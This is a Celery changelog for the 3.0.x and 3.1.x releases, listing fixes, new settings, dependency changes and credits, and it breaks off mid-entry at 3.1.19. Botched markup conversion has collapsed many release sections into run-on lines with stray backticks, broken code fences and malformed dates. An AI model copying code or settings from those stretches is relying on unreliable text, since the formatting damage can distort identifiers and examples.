\[ 4346501c-cb99-4ad8-8577-12256c7a22b1, b12ead10-a622-4d44-86e9-3193a778f345, 26c7a420-11f3-4b33-8fac-66cd3b62abfd\]\>

</div>

  - Chains can now chain other chains and use partial arguments (Issue \#1057).
    
    > Example:
    > 
    > ``` pycon
    > >>> c1 = (add.s(2) | add.s(4))
    > >>> c2 = (add.s(8) | add.s(16))
    > 
    > >>> c3 = (c1 | c2)
    > 
    > >>> # 8 + 2 + 4 + 8 + 16
    > >>> assert c3(8).get() == 38
    > ```

  - Subtasks can now be used with unregistered tasks.
    
    > You can specify subtasks even if you just have the name:
    > 
    >     >>> s = subtask(task_name, args=(), kwargs=())
    >     >>> s.delay()

  - The `celery shell` command now always adds the current directory to the module path.

  - The worker will now properly handle the <span class="title-ref">pytz.AmbiguousTimeError</span> exception raised when an ETA/countdown is prepared while being in DST transition (Issue \#1061).

  - force\_execv: Now makes sure that task symbols in the original task modules will always use the correct app instance (Issue \#1072).

  - AMQP Backend: Now republishes result messages that have been polled (using `result.ready()` and friends, `result.get()` won't do this in this version).

  - Crontab schedule values can now "wrap around"
    
    > This means that values like `11-1` translates to `[11, 12, 1]`.
    > 
    > Contributed by Loren Abrams.

  - `multi stopwait` command now shows the pid of processes.
    
    > Contributed by Loren Abrams.

  -   - Handling of ETA/countdown fixed when the `CELERY_ENABLE_UTC`  
        setting is disabled (Issue \#1065).

  - A number of unneeded properties were included in messages, caused by accidentally passing `Queue.as_dict` as message properties.

  - Rate limit values can now be float
    
    > This also extends the string format so that values like `"0.5/s"` works.
    > 
    > Contributed by Christoph Krybus

  - Fixed a typo in the broadcast routing documentation (Issue \#1026).

  - Rewrote confusing section about idempotence in the task user guide.

  - Fixed typo in the daemonization tutorial (Issue \#1055).

  - Fixed several typos in the documentation.
    
    > Contributed by Marius Gedminas.

  - Batches: Now works when using the eventlet pool.
    
    > Fix contributed by Thomas Grainger.

  - Batches: Added example sending results to `celery.contrib.batches`.
    
    > Contributed by Thomas Grainger.

  - MongoDB backend: Connection `max_pool_size` can now be set in `CELERY_MONGODB_BACKEND_SETTINGS`.
    
    > Contributed by Craig Younkins.

  - Fixed problem when using earlier versions of `pytz`.
    
    > Fix contributed by Vlad.

  - Docs updated to include the default value for the `CELERY_TASK_RESULT_EXPIRES` setting.

  - Improvements to the `django-celery` tutorial.
    
    > Contributed by Locker537.

  - The `add_consumer` control command didn't properly persist the addition of new queues so that they survived connection failure (Issue \#1079).

3.0.12 `` ` ====== :release-date: 2012-11-06 02:00 p.m. UTC :release-by: Ask Solem  - Now depends on kombu 2.4.8      - [Redis] New and improved fair queue cycle algorithm (Kevin McCarthy).     - [Redis] Now uses a Redis-based mutex when restoring messages.     - [Redis] Number of messages that can be restored in one interval is no               longer limited (but can be set using the ``unacked\_restore\_limit``:setting:`transport option <BROKER_TRANSPORT_OPTIONS>`).     - Heartbeat value can be specified in broker URLs (Mher Movsisyan).     - Fixed problem with msgpack on Python 3 (Jasper Bryant-Greene).  - Now depends on billiard 2.7.3.18  - Celery can now be used with static analysis tools like PyDev/PyCharm/pylint   etc.  - Development documentation has moved to Read The Docs.      The new URL is: https://docs.celeryq.dev/en/master  - New :setting:`CELERY_QUEUE_HA_POLICY` setting used to set the default   HA policy for queues when using RabbitMQ.  - New method``Task.subtask\_from\_request``returns a subtask using the current   request.  - Results get_many method didn't respect timeout argument.      Fix contributed by Remigiusz Modrzejewski  - generic_init.d scripts now support setting :envvar:`CELERY_CREATE_DIRS` to   always create log and pid directories (Issue #1045).      This can be set in your :file:`/etc/default/celeryd`.  - Fixed strange kombu import problem on Python 3.2 (Issue #1034).  - Worker: ETA scheduler now uses millisecond precision (Issue #1040).  - The :option:`--config <celery --config>` argument to programs is   now supported by all loaders.  - The :setting:`CASSANDRA_OPTIONS` setting has now been documented.      Contributed by Jared Biel.  - Task methods (:mod:`celery.contrib.methods`) cannot be used with the old   task base class, the task decorator in that module now inherits from the new.  - An optimization was too eager and caused some logging messages to never emit.  -``celery.contrib.batches`now works again.  - Fixed missing white-space in`bdist\_rpm`requirements (Issue #1046).  - Event state's`tasks\_by\_name`applied limit before filtering by name.      Fix contributed by Alexander A. Sosnovskiy.  .. _version-3.0.11:  3.0.11 ====== :release-date: 2012-09-26 04:00 p.m. UTC :release-by: Ask Solem  - [security:low] generic-init.d scripts changed permissions of /var/log & /var/run      In the daemonization tutorial the recommended directories were as follows:`\`bash CELERYD\_LOG\_FILE="/var/log/celery/%n.log" CELERYD\_PID\_FILE="/var/run/celery/%n.pid"

> But in the scripts themselves the default files were `/var/log/celery%n.log` and `/var/run/celery%n.pid`, so if the user didn't change the location by configuration, the directories `/var/log` and `/var/run` would be created - and worse have their permissions and owners changed.
> 
> This change means that:
> 
> >   - Default pid file is `/var/run/celery/%n.pid`
> >   - Default log file is `/var/log/celery/%n.log`
> >   - The directories are only created and have their permissions changed if *no custom locations are set*.
> 
> Users can force paths to be created by calling the `create-paths` sub-command:
> 
> ``` console
> $ sudo /etc/init.d/celeryd create-paths
> ```
> 
> <div class="admonition">
> 
> Upgrading Celery won't update init-scripts
> 
> To update the init-scripts you have to re-download the files from source control and update them manually. You can find the init-scripts for version 3.0.x at:
> 
> > <https://github.com/celery/celery/tree/3.0/extra/generic-init.d>
> 
> </div>

  - Now depends on billiard 2.7.3.17

  - Fixes request stack protection when app is initialized more than once (Issue \#1003).

  - ETA tasks now properly works when system timezone isn't same as the configured timezone (Issue \#1004).

  - Terminating a task now works if the task has been sent to the pool but not yet acknowledged by a pool process (Issue \#1007).
    
    > Fix contributed by Alexey Zatelepin

  - Terminating a task now properly updates the state of the task to revoked, and sends a `task-revoked` event.

  - Generic worker init-script now waits for workers to shutdown by default.

  - Multi: No longer parses --app option (Issue \#1008).

  - Multi: `stop_verify` command renamed to `stopwait`.

  - Daemonization: Now delays trying to create pidfile/logfile until after the working directory has been changed into.

  - `celery worker` and `celery beat` commands now respects the `--no-color <celery --no-color>` option (Issue \#999).

  - Fixed typos in eventlet examples (Issue \#1000)
    
    > Fix contributed by Bryan Bishop. Congratulations on opening bug \#1000\!

  - Tasks that raise <span class="title-ref">\~celery.exceptions.Ignore</span> are now acknowledged.

  - Beat: Now shows the name of the entry in `sending due task` logs.

<div id="version-3.0.10">

3.0.10 `` ` ====== :release-date: 2012-09-20 05:30 p.m. BST :release-by: Ask Solem  - Now depends on kombu 2.4.7  - Now depends on billiard 2.7.3.14      - Fixes crash at start-up when using Django and pre-1.4 projects       ( ``setup\_environ`).      - Hard time limits now sends the KILL signal shortly after TERM,       to terminate processes that have signal handlers blocked by C extensions.      - Billiard now installs even if the C extension cannot be built.          It's still recommended to build the C extension if you're using         a transport other than RabbitMQ/Redis (or use forced execv for some         other reason).      - Pool now sets a`current\_process().index`attribute that can be used to create       as many log files as there are processes in the pool.  - Canvas: chord/group/chain no longer modifies the state when called      Previously calling a chord/group/chain would modify the ids of subtasks     so that:`\`pycon \>\>\> c = chord(\[add.s(2, 2), add.s(4, 4)\], xsum.s()) \>\>\> c() \>\>\> c() \<-- call again

</div>

> at the second time the ids for the tasks would be the same as in the previous invocation. This is now fixed, so that calling a subtask won't mutate any options.

  - Canvas: Chaining a chord to another task now works (Issue \#965).

  - Worker: Fixed a bug where the request stack could be corrupted if relative imports are used.
    
    > Problem usually manifested itself as an exception while trying to send a failed task result (`NoneType does not have id attribute`).
    > 
    > Fix contributed by Sam Cooke.

  - Tasks can now raise <span class="title-ref">\~celery.exceptions.Ignore</span> to skip updating states or events after return.
    
    > Example:
    > 
    > ``` python
    > from celery.exceptions import Ignore
    > 
    > @task
    > def custom_revokes():
    >     if redis.sismember('tasks.revoked', custom_revokes.request.id):
    >         raise Ignore()
    > ```

  - The worker now makes sure the request/task stacks aren't modified by the initial `Task.__call__`.
    
    > This would previously be a problem if a custom task class defined `__call__` and also called `super()`.

  - Because of problems the fast local optimization has been disabled, and can only be enabled by setting the `USE_FAST_LOCALS` attribute.

  - Worker: Now sets a default socket timeout of 5 seconds at shutdown so that broken socket reads don't hinder proper shutdown (Issue \#975).

  - More fixes related to late eventlet/gevent patching.

  - Documentation for settings out of sync with reality:
    
    >   - `CELERY_TASK_PUBLISH_RETRY`
    >     
    >     > Documented as disabled by default, but it was enabled by default since 2.5 as stated by the 2.5 changelog.
    > 
    >   - `CELERY_TASK_PUBLISH_RETRY_POLICY`
    >     
    >     > The default max\_retries had been set to 100, but documented as being 3, and the interval\_max was set to 1 but documented as 0.2. The default setting are now set to 3 and 0.2 as it was originally documented.
    > 
    > Fix contributed by Matt Long.

  - Worker: Log messages when connection established and lost have been improved.

  - The repr of a Crontab schedule value of '0' should be '\*' (Issue \#972).

  - Revoked tasks are now removed from reserved/active state in the worker (Issue \#969)
    
    > Fix contributed by Alexey Zatelepin.

  - gevent: Now supports hard time limits using `gevent.Timeout`.

  - Documentation: Links to init-scripts now point to the 3.0 branch instead of the development branch (master).

  - Documentation: Fixed typo in signals user guide (Issue \#986).
    
    > `instance.app.queues` -\> `instance.app.amqp.queues`.

  - Eventlet/gevent: The worker didn't properly set the custom app for new greenlets.

  - Eventlet/gevent: Fixed a bug where the worker could not recover from connection loss (Issue \#959).
    
    > Also, because of a suspected bug in gevent the `BROKER_CONNECTION_TIMEOUT` setting has been disabled when using gevent

3.0.9 `` ` ===== :release-date: 2012-08-31 06:00 p.m. BST :release-by: Ask Solem  - Important note for users of Django and the database scheduler!      Recently a timezone issue has been fixed for periodic tasks,     but erroneous timezones could have already been stored in the     database, so for the fix to work you need to reset     the ``last\_run\_at`fields.      You can do this by executing the following command:`\`console $ python manage.py shell \>\>\> from djcelery.models import PeriodicTask \>\>\> PeriodicTask.objects.update(last\_run\_at=None)

> You also have to do this if you change the timezone or `CELERY_ENABLE_UTC` setting.

  - Note about the `CELERY_ENABLE_UTC` setting.
    
    > If you previously disabled this just to force periodic tasks to work with your timezone, then you're now *encouraged to re-enable it*.

  - Now depends on Kombu 2.4.5 which fixes PyPy + Jython installation.

  - Fixed bug with timezones when `CELERY_ENABLE_UTC` is disabled (Issue \#952).

  - Fixed a typo in the `celerybeat` upgrade mechanism (Issue \#951).

  - Make sure the <span class="title-ref">exc\_info</span> argument to logging is resolved (Issue \#899).

  - Fixed problem with Python 3.2 and thread join timeout overflow (Issue \#796).

  - A test case was occasionally broken for Python 2.5.

  - Unit test suite now passes for PyPy 1.9.

  - App instances now supports the `with` statement.
    
    > This calls the new <span class="title-ref">@close</span> method at exit, which cleans up after the app like closing pool connections.
    > 
    > Note that this is only necessary when dynamically creating apps, for example "temporary" apps.

  - Support for piping a subtask to a chain.
    
    > For example:
    > 
    > ``` python
    > pipe = sometask.s() | othertask.s()
    > new_pipe = mytask.s() | pipe
    > ```
    > 
    > Contributed by Steve Morin.

  - Fixed problem with group results on non-pickle serializers.
    
    > Fix contributed by Steeve Morin.

<div id="version-3.0.8">

3.0.8 `` ` ===== :release-date: 2012-08-29 05:00 p.m. BST :release-by: Ask Solem  - Now depends on Kombu 2.4.4  - Fixed problem with :pypi:`amqplib` and receiving larger message payloads   (Issue #922).      The problem would manifest itself as either the worker hanging,     or occasionally a ``Framing error`exception appearing.      Users of the new`pyamqp://``transport must upgrade to     :pypi:`amqp` 0.9.3.  - Beat: Fixed another timezone bug with interval and Crontab schedules   (Issue #943).  - Beat: The schedule file is now automatically cleared if the timezone   is changed.      The schedule is also cleared when you upgrade to 3.0.8 from an earlier     version, this to register the initial timezone info.  - Events: The :event:`worker-heartbeat` event now include processed and active   count fields.      Contributed by Mher Movsisyan.  - Fixed error with error email and new task classes (Issue #931).  -``BaseTask.\_\_call\_\_``is no longer optimized away if it has been monkey   patched.  - Fixed shutdown issue when using gevent (Issue #911 & Issue #936).      Fix contributed by Thomas Meson.  .. _version-3.0.7:  3.0.7 ===== :release-date: 2012-08-24 05:00 p.m. BST :release-by: Ask Solem  - Fixes several problems with periodic tasks and timezones (Issue #937).  - Now depends on kombu 2.4.2      - Redis: Fixes a race condition crash      - Fixes an infinite loop that could happen when retrying establishing       the broker connection.  - Daemons now redirect standard file descriptors to :file:`/dev/null`      Though by default the standard outs are also redirected     to the logger instead, but you can disable this by changing     the :setting:`CELERY_REDIRECT_STDOUTS` setting.  - Fixes possible problems when eventlet/gevent is patched too late.  -``LoggingProxy`no longer defines`fileno()``(Issue #928).  - Results are now ignored for the chord unlock task.      Fix contributed by Steeve Morin.  - Cassandra backend now works if result expiry is disabled.      Fix contributed by Steeve Morin.  - The traceback object is now passed to signal handlers instead   of the string representation.      Fix contributed by Adam DePue.  - Celery command: Extensions are now sorted by name.  - A regression caused the :event:`task-failed` event to be sent   with the exception object instead of its string representation.  - The worker daemon would try to create the pid file before daemonizing   to catch errors, but this file wasn't immediately released (Issue #923).  - Fixes Jython compatibility.  -``billiard.forking\_enable``was called by all pools not just the   processes pool, which would result in a useless warning if the billiard   C extensions weren't installed.  .. _version-3.0.6:  3.0.6 ===== :release-date: 2012-08-17 11:00 p.mp.m. Ask Solem  - Now depends on kombu 2.4.0  - Now depends on billiard 2.7.3.12  - Redis: Celery now tries to restore messages whenever there are no messages   in the queue.  - Crontab schedules now properly respects :setting:`CELERY_TIMEZONE` setting.      It's important to note that Crontab schedules uses UTC time by default     unless this setting is set.      Issue #904 and :pypi:`django-celery` #150.  -``billiard.enable\_forking``is now only set by the processes pool.  - The transport is now properly shown by :program:`celery report`   (Issue #913).  - The `--app` argument now works if the last part is a module name   (Issue #921).  - Fixed problem with unpickleable exceptions (billiard #12).  - Adds``task\_name`attribute to`EagerResult``which is always   `None` (Issue #907).  - Old Task class in :mod:`celery.task` no longer accepts magic kwargs by   default (Issue #918).      A regression long ago disabled magic kwargs for these, and since     no one has complained about it we don't have any incentive to fix it now.  - The``inspect reserved``control command didn't work properly.  - Should now play better with tools for static analysis by explicitly   specifying dynamically created attributes in the :mod:`celery` and   :mod:`celery.task` modules.  - Terminating a task now results in   `~celery.exceptions.RevokedTaskError` instead of a``WorkerLostError`.  -`AsyncResult.revoke`now accepts`terminate`and`signal``arguments.  - The :event:`task-revoked` event now includes new fields:``terminated`,`signum`, and`expired``.  - The argument to `~celery.exceptions.TaskRevokedError` is now one   of the reasons``revoked`,`expired`or`terminated``.  - Old Task class does no longer use `classmethod` for``push\_request`and`pop\_request`(Issue #912).  -`GroupResult`now supports the`children`attribute (Issue #916).  -`AsyncResult.collect`now respects the`intermediate`argument   (Issue #917).  - Fixes example task in documentation (Issue #902).  - Eventlet fixed so that the environment is patched as soon as possible.  - eventlet: Now warns if Celery related modules that depends on threads   are imported before eventlet is patched.  - Improved event and camera examples in the monitoring guide.  - Disables celery command setuptools entry-points if the command can't be   loaded.  - Fixed broken`dump\_request`example in the tasks guide.    .. _version-3.0.5:  3.0.5 ===== :release-date: 2012-08-01 04:00 p.m. BST :release-by: Ask Solem  - Now depends on kombu 2.3.1 + billiard 2.7.3.11  - Fixed a bug with the -B option (`cannot pickle thread.lock objects``)   (Issue #894 + Issue #892, + :pypi:`django-celery` #154).  - The :control:`restart_pool` control command now requires the   :setting:`CELERYD_POOL_RESTARTS` setting to be enabled      This change was necessary as the multiprocessing event that the restart     command depends on is responsible for creating many semaphores/file     descriptors, resulting in problems in some environments.  -``chain.apply``now passes args to the first task (Issue #889).  - Documented previously secret options to the :pypi:`django-celery` monitor   in the monitoring user guide (Issue #396).  - Old changelog are now organized in separate documents for each series,   see [history](#history).  .. _version-3.0.4:  3.0.4 ===== :release-date: 2012-07-26 07:00 p.m. BST :release-by: Ask Solem  - Now depends on Kombu 2.3  - New experimental standalone Celery monitor: Flower      See [monitoring-flower](#monitoring-flower) to read more about it!      Contributed by Mher Movsisyan.  - Now supports AMQP heartbeats if using the new``pyamqp://``transport.      - The :pypi:`amqp` transport requires the :pypi:`amqp` library to be installed:``\`console $ pip install amqp

</div>

>   - Then you need to set the transport URL prefix to `pyamqp://`.
> 
>   - The default heartbeat value is 10 seconds, but this can be changed using the `BROKER_HEARTBEAT` setting:
>     
>         BROKER_HEARTBEAT = 5.0
> 
>   - If the broker heartbeat is set to 10 seconds, the heartbeats will be monitored every 5 seconds (double the heartbeat rate).
> 
> See the \[Kombu 2.3 changelog \<kombu:version-2.3.0\>\](\#kombu-2.3-changelog-\<kombu:version-2.3.0\>) for more information.

  - Now supports RabbitMQ Consumer Cancel Notifications, using the `pyamqp://` transport.
    
    > This is essential when running RabbitMQ in a cluster.
    > 
    > See the \[Kombu 2.3 changelog \<kombu:version-2.3.0\>\](\#kombu-2.3-changelog-\<kombu:version-2.3.0\>) for more information.

  - Delivery info is no longer passed directly through.
    
    > It was discovered that the SQS transport adds objects that can't be pickled to the delivery info mapping, so we had to go back to using the white-list again.
    > 
    > Fixing this bug also means that the SQS transport is now working again.

  - The semaphore wasn't properly released when a task was revoked (Issue \#877).
    
    > This could lead to tasks being swallowed and not released until a worker restart.
    > 
    > Thanks to Hynek Schlawack for debugging the issue.

  - Retrying a task now also forwards any linked tasks.
    
    > This means that if a task is part of a chain (or linked in some other way) and that even if the task is retried, then the next task in the chain will be executed when the retry succeeds.

  - Chords: Now supports setting the interval and other keyword arguments to the chord unlock task.
    
    >   - The interval can now be set as part of the chord subtasks kwargs:
    >     
    >         chord(header)(body, interval=10.0)
    > 
    >   - In addition the chord unlock task now honors the Task.default\_retry\_delay option, used when none is specified, which also means that the default interval can also be changed using annotations:
    >     
    >     > 
    >     > 
    >     > ``` python
    >     > CELERY_ANNOTATIONS = {
    >     >     'celery.chord_unlock': {
    >     >         'default_retry_delay': 10.0,
    >     >     }
    >     > }
    >     > ```

  - New <span class="title-ref">@add\_defaults</span> method can add new default configuration dictionaries to the applications configuration.
    
    > For example:
    > 
    >     config = {'FOO': 10}
    >     
    >     app.add_defaults(config)
    > 
    > is the same as `app.conf.update(config)` except that data won't be copied, and that it won't be pickled when the worker spawns child processes.
    > 
    > In addition the method accepts a callable:
    > 
    >     def initialize_config():
    >         # insert heavy stuff that can't be done at import time here.
    >     
    >     app.add_defaults(initialize_config)
    > 
    > which means the same as the above except that it won't happen until the Celery configuration is actually used.
    > 
    > As an example, Celery can lazily use the configuration of a Flask app:
    > 
    >     flask_app = Flask()
    >     app = Celery()
    >     app.add_defaults(lambda: flask_app.config)

  - Revoked tasks weren't marked as revoked in the result backend (Issue \#871).
    
    > Fix contributed by Hynek Schlawack.

  - Event-loop now properly handles the case when the `epoll` poller object has been closed (Issue \#882).

  - Fixed syntax error in `funtests/test_leak.py`
    
    > Fix contributed by Catalin Iacob.

  - group/chunks: Now accepts empty task list (Issue \#873).

  - New method names:
    
    >   - `Celery.default_connection()` ➠ <span class="title-ref">\~@connection\_or\_acquire</span>.
    >   - `Celery.default_producer()` ➠ <span class="title-ref">\~@producer\_or\_acquire</span>.
    > 
    > The old names still work for backward compatibility.

<div id="version-3.0.3">

3.0.3 `` ` ===== :release-date: 2012-07-20 09:17 p.m. BST :release-by: Ask Solem  - :pypi:`amqplib` passes the channel object as part of the delivery_info   and it's not pickleable, so we now remove it.  .. _version-3.0.2:  3.0.2 ===== :release-date: 2012-07-20 04:00 p.m. BST :release-by: Ask Solem  - A bug caused the following task options to not take defaults from the    configuration (Issue #867 + Issue #858)      The following settings were affected:      - :setting:`CELERY_IGNORE_RESULT`     - :setting:`CELERYD_SEND_TASK_ERROR_EMAILS`     - :setting:`CELERY_TRACK_STARTED`     - :setting:`CElERY_STORE_ERRORS_EVEN_IF_IGNORED`      Fix contributed by John Watson.  - Task Request: ``delivery\_info``is now passed through as-is (Issue #807).  - The ETA argument now supports datetime's with a timezone set (Issue #855).  - The worker's banner displayed the autoscale settings in the wrong order   (Issue #859).  - Extension commands are now loaded after concurrency is set up   so that they don't interfere with things like eventlet patching.  - Fixed bug in the threaded pool (Issue #863)  - The task failure handler mixed up the fields in `sys.exc_info`.      Fix contributed by Rinat Shigapov.  - Fixed typos and wording in the docs.      Fix contributed by Paul McMillan  - New setting: :setting:`CELERY_WORKER_DIRECT`      If enabled each worker will consume from their own dedicated queue     which can be used to route tasks to specific workers.  - Fixed several edge case bugs in the add consumer remote control command.  - :mod:`~celery.contrib.migrate`: Can now filter and move tasks to specific   workers if :setting:`CELERY_WORKER_DIRECT` is enabled.      Among other improvements, the following functions have been added:          *``move\_direct(filterfun, **opts)\`\` \* \`\`move\_direct\_by\_id(task\_id, worker\_hostname,**opts)`*`move\_direct\_by\_idmap({task\_id: worker\_hostname, ...}, **opts)\`\` \* \`\`move\_direct\_by\_taskmap({task\_name: worker\_hostname, ...},**opts)``- `~celery.Celery.default_connection` now accepts a pool argument that   if set to false causes a new connection to be created instead of acquiring   one from the pool.  - New signal: :signal:`celeryd_after_setup`.  - Default loader now keeps lowercase attributes from the configuration module.  .. _version-3.0.1:  3.0.1 ===== :release-date: 2012-07-10 06:00 p.m. BST :release-by: Ask Solem  - Now depends on kombu 2.2.5  - inspect now supports limit argument::      myapp.control.inspect(limit=1).ping()  - Beat: now works with timezone aware datetime's.  - Task classes inheriting``from celery import Task`mistakenly enabled`accept\_magic\_kwargs`.  - Fixed bug in`inspect scheduled``(Issue #829).  - Beat: Now resets the schedule to upgrade to UTC.  - The :program:`celery worker` command now works with eventlet/gevent.      Previously it wouldn't patch the environment early enough.  - The :program:`celery` command now supports extension commands   using setuptools entry-points.      Libraries can add additional commands to the :program:`celery`     command by adding an entry-point like::          setup(             entry_points=[                 'celery.commands': [                     'foo = my.module:Command',             ],         ],         ...)      The command must then support the interface of     `celery.bin.base.Command`.  - contrib.migrate: New utilities to move tasks from one queue to another.      - `~celery.contrib.migrate.move_tasks`     - `~celery.contrib.migrate.move_task_by_id`  - The :event:`task-sent` event now contains``exchange`and`routing\_key\`\` fields.

</div>

  - Fixes bug with installing on Python 3.
    
    > Fix contributed by Jed Smith.

## 3.0.0 (Chiastic Slide)

  - release-date  
    2012-07-07 01:30 p.m. BST

  - release-by  
    Ask Solem

See \[whatsnew-3.0\](\#whatsnew-3.0).

---

changelog-3.1.md

---

# Change history

This document contains change notes for bugfix releases in the 3.1.x series (Cipater), please see \[whatsnew-3.1\](\#whatsnew-3.1) for an overview of what's new in Celery 3.1.

## 3.1.26

  - release-date  
    2018-23-03 16:00 PM IST

  - release-by  
    Omer Katz

<!-- end list -->

  - Fixed a crash caused by tasks cycling between Celery 3 and Celery 4 workers.

## 3.1.25

  - release-date  
    2016-10-10 12:00 PM PDT

  - release-by  
    Ask Solem

<!-- end list -->

  - **Requirements**
    
    >   - Now depends on \[Kombu 3.0.37 \<kombu:version-3.0.37\>\](\#kombu-3.0.37-\<kombu:version-3.0.37\>)

  - Fixed problem with chords in group introduced in 3.1.24 (Issue \#3504).

## 3.1.24

  - release-date  
    2016-09-30 04:21 PM PDT

  - release-by  
    Ask Solem

<!-- end list -->

  - **Requirements**
    
    >   - Now depends on \[Kombu 3.0.36 \<kombu:version-3.0.36\>\](\#kombu-3.0.36-\<kombu:version-3.0.36\>).

  - Now supports Task protocol 2 from the future 4.0 release.
    
    > Workers running 3.1.24 are now able to process messages sent using the [new task message protocol](https://docs.celeryq.dev/en/master/internals/protocol.html#version-2) to be introduced in Celery 4.0.
    > 
    > Users upgrading to Celery 4.0 when this is released are encouraged to upgrade to this version as an intermediate step, as this means workers not yet upgraded will be able to process messages from clients/workers running 4.0.

  - `Task.send_events` can now be set to disable sending of events for that task only.
    
    > Example when defining the task:
    > 
    >   - \`\`\`python  
    >     @app.task(send\_events=False) def add(x, y): return x + y

  - **Utils**: Fixed compatibility with recent `psutil` versions (Issue \#3262).

  - **Canvas**: Chord now forwards partial arguments to its subtasks.
    
    > Fix contributed by Tayfun Sen.

  - **App**: Arguments to app such as `backend`, `broker`, etc are now pickled and sent to the child processes on Windows.
    
    > Fix contributed by Jeremy Zafran.

  - **Deployment**: Generic init scripts now supports being symlinked in runlevel directories (Issue \#3208).

  - **Deployment**: Updated CentOS scripts to work with CentOS 7.
    
    > Contributed by Joe Sanford.

  - **Events**: The curses monitor no longer crashes when the result of a task is empty.
    
    > Fix contributed by Dongweiming.

  - **Worker**: `repr(worker)` would crash when called early in the startup process (Issue \#2514).

  - **Tasks**: GroupResult now defines \_\_bool\_\_ and \_\_nonzero\_\_.
    
    > This is to fix an issue where a ResultSet or GroupResult with an empty result list are not properly tupled with the as\_tuple() method when it is a parent result. This is due to the as\_tuple() method performing a logical and operation on the ResultSet.
    > 
    > Fix contributed by Colin McIntosh.

  - **Worker**: Fixed wrong values in autoscale related logging message.
    
    > Fix contributed by `@raducc`.

  - Documentation improvements by
    
    >   - Alexandru Chirila
    >   - Michael Aquilina
    >   - Mikko Ekström
    >   - Mitchel Humpherys
    >   - Thomas A. Neil
    >   - Tiago Moreira Vieira
    >   - Yuriy Syrovetskiy
    >   - `@dessant`

<div id="version-3.1.23">

3.1.23 `` ` ====== :release-date: 2016-03-09 06:00 P.M PST :release-by: Ask Solem  - **Programs**: Last release broke support for the ``--hostnmame``argument   to :program:`celery multi` and :program:`celery worker --detach`   (Issue #3103).  - **Results**: MongoDB result backend could crash the worker at startup   if not configured using an URL.  .. _version-3.1.22:  3.1.22 ====== :release-date: 2016-03-07 01:30 P.M PST :release-by: Ask Solem  - **Programs**: The worker would crash immediately on startup on``backend.as\_uri()``when using some result backends (Issue #3094).  - **Programs**: :program:`celery multi`/:program:`celery worker --detach`   would create an extraneous logfile including literal formats (e.g.``%I``)   in the filename (Issue #3096).  .. _version-3.1.21:  3.1.21 ====== :release-date: 2016-03-04 11:16 a.m. PST :release-by: Ask Solem  - **Requirements**      - Now depends on [Kombu 3.0.34 <kombu:version-3.0.34>](#kombu-3.0.34-<kombu:version-3.0.34>).      - Now depends on :mod:`billiard` 3.3.0.23.  - **Prefork pool**: Fixes 100% CPU loop on Linux :manpage:`epoll`   (Issue #1845).      Also potential fix for: Issue #2142, Issue #2606  - **Prefork pool**: Fixes memory leak related to processes exiting   (Issue #2927).  - **Worker**: Fixes crash at start-up when trying to censor passwords   in MongoDB and Cache result backend URLs (Issue #3079, Issue #3045,   Issue #3049, Issue #3068, Issue #3073).      Fix contributed by Maxime Verger.  - **Task**: An exception is now raised if countdown/expires is less   than -2147483648 (Issue #3078).  - **Programs**: :program:`celery shell --ipython` now compatible with newer   :pypi:`IPython` versions.  - **Programs**: The DuplicateNodeName warning emitted by inspect/control   now includes a list of the node names returned.      Contributed by Sebastian Kalinowski.  - **Utils**: The``.discard(item)``method of   `~celery.utils.collections.LimitedSet` didn't actually remove the item   (Issue #3087).      Fix contributed by Dave Smith.  - **Worker**: Node name formatting now emits less confusing error message   for unmatched format keys (Issue #3016).  - **Results**: RPC/AMQP backends: Fixed deserialization of JSON exceptions   (Issue #2518).      Fix contributed by Allard Hoeve.  - **Prefork pool**: The `process inqueue damaged` error message now includes   the original exception raised.  - **Documentation**: Includes improvements by:      - Jeff Widman.  .. _version-3.1.20:  3.1.20 ====== :release-date: 2016-01-22 06:50 p.m. UTC :release-by: Ask Solem  - **Requirements**      - Now depends on [Kombu 3.0.33 <kombu:version-3.0.33>](#kombu-3.0.33-<kombu:version-3.0.33>).      - Now depends on :mod:`billiard` 3.3.0.22.          Includes binary wheels for Microsoft Windows x86 and x86_64!  - **Task**: Error emails now uses``utf-8`character set by default   (Issue #2737).  - **Task**: Retry now forwards original message headers (Issue #3017).  - **Worker**: Bootsteps can now hook into`on\_node\_join`/`leave`/`lost`.      See [extending-consumer-attributes](#extending-consumer-attributes) for an example.  - **Events**: Fixed handling of DST timezones (Issue #2983).  - **Results**: Redis backend stopped respecting certain settings.      Contributed by Jeremy Llewellyn.  - **Results**: Database backend now properly supports JSON exceptions   (Issue #2441).  - **Results**: Redis`new\_join``didn't properly call task errbacks on chord   error (Issue #2796).  - **Results**: Restores Redis compatibility with Python :pypi:`redis` < 2.10.0   (Issue #2903).  - **Results**: Fixed rare issue with chord error handling (Issue #2409).  - **Tasks**: Using queue-name values in :setting:`CELERY_ROUTES` now works   again (Issue #2987).  - **General**: Result backend password now sanitized in report output   (Issue #2812, Issue #2004).  - **Configuration**: Now gives helpful error message when the result backend   configuration points to a module, and not a class (Issue #2945).  - **Results**: Exceptions sent by JSON serialized workers are now properly   handled by pickle configured workers.  - **Programs**:``celery control autoscale`now works (Issue #2950).  - **Programs**:`celery beat --detached`now runs after fork callbacks.  - **General**: Fix for LRU cache implementation on Python 3.5 (Issue #2897).      Contributed by Dennis Brakhane.      Python 3.5's`OrderedDict``doesn't allow mutation while it is being     iterated over. This breaks "update" if it is called with a dict     larger than the maximum size.      This commit changes the code to a version that doesn't iterate over     the dict, and should also be a little bit faster.  - **Init-scripts**: The beat init-script now properly reports service as down   when no pid file can be found.      Eric Zarowny  - **Beat**: Added cleaning of corrupted scheduler files for some storage   backend errors (Issue #2985).      Fix contributed by Aleksandr Kuznetsov.  - **Beat**: Now syncs the schedule even if the schedule is empty.      Fix contributed by Colin McIntosh.  - **Supervisord**: Set higher process priority in the :pypi:`supervisord`     example.      Contributed by George Tantiras.  - **Documentation**: Includes improvements by:      :github_user:`Bryson`     Caleb Mingle     Christopher Martin     Dieter Adriaenssens     Jason Veatch     Jeremy Cline     Juan Rossi     Kevin Harvey     Kevin McCarthy     Kirill Pavlov     Marco Buttu     :github_user:`Mayflower`     Mher Movsisyan     Michael Floering     :github_user:`michael-k`     Nathaniel Varona     Rudy Attias     Ryan Luckie     Steven Parker     :github_user:`squfrans`     Tadej Janež     TakesxiSximada     Tom S  .. _version-3.1.19:  3.1.19 ====== :release-date: 2015-10-26 01:00 p.m. UTC :release-by: Ask Solem  - **Requirements**      - Now depends on [Kombu 3.0.29 <kombu:version-3.0.29>](#kombu-3.0.29-<kombu:version-3.0.29>).      - Now depends on :mod:`billiard` 3.3.0.21.  -  **Results**: Fixed MongoDB result backend URL parsing problem    (Issue 